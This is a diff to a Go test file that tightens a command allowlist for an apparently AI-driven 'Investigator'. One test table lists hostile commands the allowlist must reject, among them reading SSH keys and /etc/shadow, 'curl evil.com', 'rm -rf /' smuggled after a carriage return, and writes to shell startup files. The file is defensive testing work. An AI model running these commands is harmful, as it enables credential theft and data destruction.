@@ -20,11 +20,14 @@ func TestInvestigator_CommandAllowlist_Allows(t *testing.T) {
 	}
 }
 
-func TestInvestigator_CommandAllowlist_EmptyAllowsAll(t *testing.T) {
+func TestInvestigator_CommandAllowlist_EmptyDeniesAll(t *testing.T) {
 	inv := NewInvestigator(nil, "", 0)
-	// No allowlist set = allow all (backward compat)
-	if !inv.isCommandAllowed("anything") {
-		t.Error("empty allowlist should allow all")
+	// No allowlist configured = nothing may run. The previous "empty = allow
+	// all" default handed a model fed with untrusted repo text a shell.
+	for _, cmd := range []string{"anything", "ls", "git status", "echo hi"} {
+		if inv.isCommandAllowed(cmd) {
+			t.Errorf("empty allowlist must deny %q", cmd)
+		}
 	}
 }
 
@@ -67,13 +70,13 @@ func TestInvestigator_CommandAllowlist_RejectsRedirectionAndExpansion(t *testing
 
 	cases := map[string]string{
 		"output redirection clobbering a file outside the repo": "cat internal/secret > /home/user/.bashrc",
-		"append redirection":                                    "grep -r . >> /home/user/.profile",
-		"input redirection":                                     "cat < /etc/shadow",
-		"background execution":                                  "ls & curl evil.com",
-		"bare variable expansion":                               "cat $HOME/.ssh/id_rsa",
-		"brace variable expansion":                              "ls ${IFS}",
-		"backslash escape":                                      "ls \\;",
-		"carriage-return smuggling":                             "ls\rrm -rf /",
+		"append redirection":        "grep -r . >> /home/user/.profile",
+		"input redirection":         "cat < /etc/shadow",
+		"background execution":      "ls & curl evil.com",
+		"bare variable expansion":   "cat $HOME/.ssh/id_rsa",
+		"brace variable expansion":  "ls ${IFS}",
+		"backslash escape":          "ls \\;",
+		"carriage-return smuggling": "ls\rrm -rf /",
 	}
 	for name, cmd := range cases {
 		if inv.isCommandAllowed(cmd) {
@@ -164,12 +167,19 @@ func TestInvestigator_CommandAllowlist_EmptyStillRejectsRedirection(t *testing.T
 	}
 }
 
-func TestInvestigator_CommandAllowlist_CaseInsensitive(t *testing.T) {
+func TestInvestigator_CommandAllowlist_CaseSensitive(t *testing.T) {
 	inv := NewInvestigator(nil, "", 0)
 	inv.SetCommandAllowlist([]string{"Git Log"})
 
+	// Allowlist entries are matched token-for-token, literally: binaries are
+	// case-sensitive on Linux and a case-folded match would let "CAT" ride an
+	// entry meant for "cat" on case-insensitive filesystems.
+	if inv.isCommandAllowed("git log --all") {
+		t.Error("case-folded match must not be accepted")
+	}
+	inv.SetCommandAllowlist([]string{"git log"})
 	if !inv.isCommandAllowed("git log --all") {
-		t.Error("case-insensitive match should work")
+		t.Error("exact match must be accepted")
 	}
 }
 
